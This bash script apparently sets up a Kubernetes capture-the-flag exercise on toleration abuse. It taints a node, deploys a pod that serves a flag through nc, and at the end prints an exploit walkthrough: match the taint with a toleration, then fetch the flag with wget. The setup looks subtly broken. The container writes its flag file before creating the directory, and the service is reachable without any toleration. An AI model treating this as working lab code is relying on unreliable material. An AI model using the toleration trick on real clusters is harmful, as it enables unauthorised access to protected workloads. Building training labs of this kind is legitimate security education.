#!/bin/bash
set -euo pipefail
K8S_ID="k8s-29"
CLUSTER_NAME="cve-k8s-29-toleration"
source "$(dirname "$0")/../../scripts/k8s-common.sh"

echo "[K8S-29] Toleration Abuse"
k8s_init
k8s_create_host_flag
k8s_create_cluster
k8s_wait_ready

echo "[*] Tainting one worker node to protect flag pod..."
WORKER_NODES=$(kubectl get nodes -l '!node-role.kubernetes.io/control-plane' -o name)
FIRST_WORKER=$(echo "$WORKER_NODES" | head -1)
kubectl taint "$FIRST_WORKER" protected=true:NoSchedule --overwrite 2>/dev/null || true

k8s_load_images alpine:latest

k8s_apply << 'YAML'
apiVersion: v1
kind: Namespace
metadata:
  name: vault-ns
---
apiVersion: v1
kind: Pod
metadata:
  name: vault-pod
  namespace: vault-ns
  labels:
    app: vault
spec:
  tolerations:
    - key: "protected"
      operator: "Equal"
      value: "true"
      effect: "NoSchedule"
  containers:
    - name: vault
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["/bin/sh", "-c"]
      args:
        - "echo flag > /vault/flag.txt && mkdir -p /vault && while true; do printf 'HTTP/1.1 200 OK\r\n\r\n%s' \"$(cat /vault/flag.txt)\" | nc -l -p 8080 -w 1; done"
      ports:
        - containerPort: 8080
---
apiVersion: v1
kind: Service
metadata:
  name: vault-svc
  namespace: vault-ns
spec:
  selector:
    app: vault
  ports:
    - port: 8080
---
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: vault-ns
spec:
  containers:
    - name: attacker
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
YAML

k8s_wait_pod "vault-pod" "vault-ns"
k8s_wait_pod "attacker-pod" "vault-ns"
sleep 5

FLAG_IP=$(kubectl get svc vault-svc -n vault-ns -o jsonpath='{.spec.clusterIP}')
kubectl exec -n vault-ns vault-pod -- sh -c "echo '$FLAG' > /vault/flag.txt" 2>/dev/null || true

k8s_info
echo "    Flag in: vault-pod on tainted node"
echo "    Service: vault-svc.vault-ns.svc.cluster.local:8080"
echo ""
echo "    Exploit: Discover taint and create matching toleration"
echo "    kubectl describe nodes | grep Taint"
echo "    kubectl run tolerator --image=alpine -n vault-ns --overrides='{\"spec\":{\"tolerations\":[{\"key\":\"protected\",\"operator\":\"Equal\",\"value\":\"true\",\"effect\":\"NoSchedule\"}]}}' -- sleep 3600"
echo "    kubectl exec -n vault-ns tolerator -- wget -qO- http://${FLAG_IP}:8080"
